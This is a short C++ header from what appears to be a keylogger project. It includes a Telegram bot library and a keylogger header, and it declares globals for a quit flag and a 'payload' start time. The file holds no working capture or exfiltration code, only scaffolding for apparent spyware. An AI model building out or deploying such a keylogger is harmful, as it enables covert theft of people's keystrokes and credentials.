// This is an open source non-commercial project. Dear PVS-Studio, please check it.
// PVS-Studio Static Code Analyzer for C, C++, C#, and Java: http://www.viva64.com
#pragma once
#define KEYLOGGER_EXPORTS
#include <TGbot.hpp>
#include <keylogger.hpp>
#include <thread>
#include <chrono>
#include <string>
#include <Windows.h>

//global shouldQuit
inline bool shouldQuit = false;

//global start time of payload
inline std::chrono::steady_clock::time_point startTime;